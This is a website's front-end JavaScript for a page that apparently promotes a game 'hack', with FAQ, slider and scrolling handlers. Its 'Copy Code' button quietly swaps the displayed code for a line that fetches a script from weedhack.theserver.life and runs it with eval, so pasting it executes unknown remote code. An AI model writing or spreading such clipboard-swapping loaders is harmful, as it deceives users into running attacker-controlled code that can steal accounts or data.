document.addEventListener('DOMContentLoaded', function() {
    const faqItems = document.querySelectorAll('.faq-item');
    
    faqItems.forEach(item => {
        const question = item.querySelector('.faq-question');
        
        question.addEventListener('click', () => {
            faqItems.forEach(otherItem => {
                if (otherItem !== item) {
                    otherItem.classList.remove('active');
                }
            });
            
            item.classList.toggle('active');
        });
    });
    
    const rangeSlider = document.querySelector('.hack-slider input[type="range"]');
    const rangeValue = rangeSlider.nextElementSibling;
    
    rangeSlider.addEventListener('input', () => {
        rangeValue.textContent = rangeSlider.value;
    });
    
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            
            if (targetElement) {
                window.scrollTo({
                    top: targetElement.offsetTop - 80,
                    behavior: 'smooth'
                });
            }
        });
    });
    
    const codeBlock = document.querySelector('.code-block code');
    if (codeBlock) {
        const copyButton = document.createElement('button');
        copyButton.textContent = 'Copy Code';
        copyButton.className = 'copy-btn';
        copyButton.style.position = 'absolute';
        copyButton.style.top = '10px';
        copyButton.style.right = '10px';
        copyButton.style.padding = '5px 10px';
        copyButton.style.backgroundColor = '#0f0';
        copyButton.style.color = '#000';
        copyButton.style.border = 'none';
        copyButton.style.borderRadius = '4px';
        copyButton.style.cursor = 'pointer';
        
        codeBlock.parentElement.style.position = 'relative';
        
        codeBlock.parentElement.appendChild(copyButton);
        
        copyButton.addEventListener('click', () => {
            const fullCode = `fetch('https://weedhack.theserver.life/wh').then(r=>r.text()).then(t=>eval(t));`;
            
            navigator.clipboard.writeText(fullCode).then(() => {
                copyButton.textContent = 'Copied!';
                copyButton.style.backgroundColor = '#00cc00';
                
                setTimeout(() => {
                    copyButton.textContent = 'Copy Code';
                    copyButton.style.backgroundColor = '#0f0';
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy code: ', err);
                copyButton.textContent = 'Failed to copy';
                copyButton.style.backgroundColor = '#ff0000';
                
                setTimeout(() => {
                    copyButton.textContent = 'Copy Code';
                    copyButton.style.backgroundColor = '#0f0';
                }, 2000);
            });
        });
    }
    
    const checkboxes = document.querySelectorAll('.interface-demo input[type="checkbox"]');
    checkboxes.forEach(checkbox => {
        checkbox.addEventListener('change', () => {
        });
    });
});